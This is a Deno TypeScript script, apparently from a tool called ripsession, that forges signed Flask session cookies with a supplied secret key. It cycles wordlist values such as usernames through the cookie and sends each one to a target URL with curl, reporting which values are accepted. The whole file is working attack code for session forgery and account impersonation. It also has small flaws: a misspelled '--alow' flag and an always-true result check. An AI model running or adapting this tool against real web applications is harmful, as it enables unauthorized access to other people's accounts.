/*
Dependencies (in path): cURL, flask-unsign
Usage: 
deno run --alow run index.ts -u <address> -c <cookie> -s <secret> -f <failure idicator> -w <wordlist>

Detailed arguments explaination:

Cookie: for example "{'logged_in': True, 'username': 'changeMe'}" 

The script will detect 'changeMe' and replace it each time with the next wordlist item.
Secret: Secret to encrypt the cookie with

Failure indicator is a string that when found in the curl output will indicate that the cookie value didn't work.

Optional flag: 
--multi: Run through the whole wordlist even if the script finds a valid value.
*/
import { readLines } from "https://deno.land/std@0.142.0/io/mod.ts";
import getHeader from "./getHeader.ts";
import getFlags from "./getFlags.ts";

const flags = getFlags(Deno.args);

const {
  u: url,
  c: cookie,
  s: secret,
  f: failureIndicator,
  w: wordlist,
} = flags.string as Record<string, string>;

if (!(url && cookie && secret && failureIndicator && wordlist)) {
  console.log("Not enough parameters specified \n");
  console.log(
    "Please visit https://github.com/Tagvi/ripsession for documentation"
  );
  Deno.exit(1);
}
const fileReader = await Deno.open(wordlist);

const matches = [];

for await (const line of readLines(fileReader)) {
  const cmd = ["curl", url, "-H", await getHeader(cookie, secret, line)];

  const p = Deno.run({
    cmd,
    stdout: "piped",
    stderr: "piped",
  });
  const { code } = await p.status();
  const rawOutput = await p.output();

  const rawError = await p.stderrOutput();
  if (code === 0) {
    const output = new TextDecoder().decode(rawOutput);

    if (output.includes(failureIndicator)) continue;
    if (!flags.boolean.multi) {
      console.log(`Found ${line}`);
      Deno.exit(0);
    }
    matches.push(line);
  } else {
    const errorString = new TextDecoder().decode(rawError);
    console.error(errorString);
    Deno.exit(code);
  }
}
if (matches) {
  console.log("Found: ", matches);
} else {
  console.log("Found none");
}
Deno.exit(0);
